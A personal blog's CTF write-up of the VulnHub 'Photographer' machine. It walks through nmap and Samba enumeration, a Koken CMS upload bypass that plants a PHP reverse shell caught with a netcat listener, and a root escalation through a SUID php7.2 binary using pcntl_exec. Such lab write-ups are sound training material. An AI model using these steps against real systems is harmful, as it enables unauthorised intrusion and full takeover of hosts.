---
layout: post
current: post
cover: 'assets/images/photographer.png'
navigation: True
title: Photographer Write Up
date: 2020-09-04 00:00:00
tags: [vulnhub, ctf, oscp]
class: post-template
subclass: 'post'
author: darryn
---
![Photographer](/assets/images/photographer.png)

### Overview

Photographer was the last machine I did before I took my OSCP exam so it seemed fitting for it to be the first write up on my new blog. Photographer was a great OSCP like machine created by [v1n1v131r4](https://twitter.com/v1n1v131r4).

### Nmap

Starting with a Nmap scan lets see what ports are open. I got the IP of the machine by checking the DHCP server on my network. However, I could have used arp-scan to find the IP address.

```
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $nmap -sC -sV -oA nmap/initial 192.168.1.77
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 17:54 BST
Nmap scan report for 192.168.1.77
Host is up (0.0012s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Koken 0.22.24
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: Host: PHOTOGRAPHER

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2020-09-01T12:54:28-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-01T16:54:28
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds                                                                 
```

The scan reveals 4 ports open, Samba and two web. Based on the HTTP banners it looks to be a Linux Ubuntu machine, Googling apache 2.4.18 ubuntu reveals the OS is probably Ubuntu Xenial 16.04 LTS.

### Enumeration

I started with port 80 but didn't find anything interesting. I ran Gobuster and Nikto and both came up blank so decided to move on for now. On port 8000 I'm presented with a CMS type page. Looking at the footer indicates 'Built with Koken'.

![Port 8000](/assets/images/photographer/Port-8000.png)

A quick Google shows [Koken](http://koken.me/) is a CMS for photographers. An [exploit](https://www.exploit-db.com/exploits/48706) is also available by the same author of the machine which would indicate this is the intend path. However, the exploit requires authentication. 

![Exploit](/assets/images/photographer/exploit.png)

Looking at the exploit, the POST request makes a call to **/admin/**. Going to the URL does provide a login page requiring a email address and password. I will take a look at Samba before going any further on the web ports.

![Login](/assets/images/photographer/login.png)

Using smbclient and logging in anonymously shows one share in particular that looks interesting 'sambashare'. 

```
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $smbclient -L \\\\192.168.1.77\\

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $smbclient \\\\192.168.1.77\\sambashare\\
Enter WORKGROUP\daz\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 21 02:30:07 2020
  ..                                  D        0  Tue Jul 21 10:44:25 2020
  mailsent.txt                        N      503  Tue Jul 21 02:29:40 2020
  wordpress.bkp.zip                   N 13930308  Tue Jul 21 02:22:23 2020

                278627392 blocks of size 1024. 264268400 blocks available
smb: \> mget *
Get file mailsent.txt? y
getting file \mailsent.txt of size 503 as mailsent.txt (245.6 KiloBytes/sec) (average 245.6 KiloBytes/sec)
Get file wordpress.bkp.zip? y
getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (67013.8 KiloBytes/sec) (average 66362.5 KiloBytes/sec)
smb: \> 
```

Two files are on the share, the first is an email from Agi to Daisa advising the site is ready and the other file appears to be a backup zip of the site.

```
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $cat mailsent.txt 
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website\'s
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don\'t forget your secret, my babygirl ;)
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $                                                                                                                       
```

'babygirl' looks to be a hint to the password and I now have 2 users and email addresses:

- Agi Clarence - agi@photographer.com
- Daisa Ahomi - daisa@photographer.com

### Foot hold

I go back to port **8000/admin/** and try them out. I get straight in with **daisa@photographer.com** and **babygirl**. 

![CMS](/assets/images/photographer/cms.png)

Going back to the exploit from earlier, it looks like I can upload a PHP file by saving the file as .jpg then use Burp to rename it. Im going to try and upload a reverse shell PHP script. If your using Kali or ParrotOS the script can be found in /usr/share/webshells/php/ or downloaded from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

```
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $mv php-reverse-shell.php shell.php.jpg                                                                                 
```

I update the script with my local IP and port details.

```
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS                                                                                           
```

Start a netcat listener ready to catch the shell.

```
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $sudo nc -nvlp 443
listening on [any] 443 ...                                                                                                   
```

Going back to the admin page I upload the file using 'Import content' and find the PHP file. With Burp open and proxy intercept on I set Burp as a proxy in my browser and select 'Import'.

![Content](/assets/images/photographer/content.png)

In Burp I can now remove the .jpg extension from the file and forward the request.

![Burp](/assets/images/photographer/burp.png)

With the file selected, right clicking on 'Download File' and 'Open Link in New Tab' should run out PHP script. 

![DownloadFile](/assets/images/photographer/downloadfile.png)

I have a shell as www-data! First thing I always do is upgrade it to a more stable TTY using Python.

![Shell](/assets/images/photographer/shell.png)

The first flag can be found in Daisa's user directory.

```
www-data@photographer:/$ cd home/daisa/
www-data@photographer:/home/daisa$ ls
Desktop    Downloads  Pictures  Templates  examples.desktop
Documents  Music      Public    Videos     user.txt
www-data@photographer:/home/daisa$ cat user.txt 
d41d8cd98f00{REDACTED}
www-data@photographer:/home/daisa$                                                                                           
```

### Privilege Escalation

I now need to escalate out of www-data to either a user or root. Im going to use [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) to enumerate the machine for possible local privilege escalation paths. First I will use Python to copy the script from my machine.

![linpeas](/assets/images/photographer/linpeas.png)

Linpeas provides a lot of output, looking through the output **/usr/bin/php7.2** jumps out. 

> Linpeas will colour code the output based on severity but notice /usr/bin/php7.2 is green. Its important to review all the output and not rely on the scripts/tools to identify potential attack vectors.

![suid](/assets/images/photographer/suid.png)

First I will check [GTFOBins](https://gtfobins.github.io), searching PHP.

![gtfobins](/assets/images/photographer/phpsuid.png)

Lets give it a go.

```
www-data@photographer:/tmp$ CMD="/bin/sh"
www-data@photographer:/tmp$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
root
#
```

We have root! Lets grab the flag.

```
# 
# cd /root
# cat proof.txt
                                                                
                                .:/://::::///:-`                
                            -/++:+`:--:o:  oo.-/+/:`            
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`         
                       :o:``oyo/o`. `      ```/-so:+--+/`       
                     -o:-`yh//.                 `./ys/-.o/      
                    ++.-ys/:/y-                  /s-:/+/:/o`    
                   o/ :yo-:hNN                   .MNs./+o--s`   
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s   
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/  
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h  
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s. 
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +- 
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o. 
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h` 
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o  
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`  
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-   
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.    
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`     
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-       
                        ./+:`:yh:dso/.+-++++ss+h++.:++-         
                           -/+/-:-/y+/d:yh-o:+--/+/:`           
                              `-///////////////:`               
                                                                

Follow me at: http://v1n1v131r4.com


d41d8cd98f00{REDACTED}
#
```



